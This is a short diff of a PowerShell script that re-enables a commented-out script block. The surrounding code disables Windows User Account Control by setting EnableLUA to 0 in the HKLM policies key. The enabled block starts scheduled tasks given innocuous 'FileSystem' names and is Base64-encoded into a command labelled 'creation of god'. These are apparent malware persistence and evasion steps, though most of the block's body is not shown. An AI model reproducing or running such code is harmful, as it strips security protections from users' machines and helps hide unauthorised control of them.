@@ -1,7 +1,7 @@
 $scriptBlock10={
     New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
    
-  #  $scriptBlock20=@'
+    $scriptBlock20=@'
         #god do
         #check for background and stuff
         # user do
@@ -86,7 +86,7 @@ $scriptBlock10={
                 Start-ScheduledTask -TaskName "FileSystem $modifiedString"
             }
         }
-#'@
+'@
 
     #creation of god
     $encodedCommand20=$encodedCommand20 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock20.ToString()))
